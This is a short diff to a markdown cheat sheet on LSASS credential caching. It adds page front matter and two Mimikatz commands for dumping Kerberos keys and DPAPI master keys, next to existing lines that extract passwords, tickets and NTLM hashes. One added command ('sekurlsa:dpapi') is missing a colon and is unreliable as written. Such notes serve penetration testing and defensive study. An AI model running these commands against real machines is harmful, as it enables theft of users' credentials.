@@ -1,3 +1,7 @@
+---
+title: "LSASS"
+---
+
 # 🔓 LSASS
 
 - Cache credentials locally in memory
@@ -79,6 +83,8 @@ sekurlsa::logonPasswords        # extract password
 
 sekurlsa::tickets      # Kerberos tickets
 sekurlsa::msv          # LM/NTLM hashes only
+sekurlsa::ekeys        # Kerberos keys AES/RC4
+sekurlsa:dpapi         # Master keys DPAPI of connected users
 dpapi::masterkey       # DPAPI master keys
 ```
 
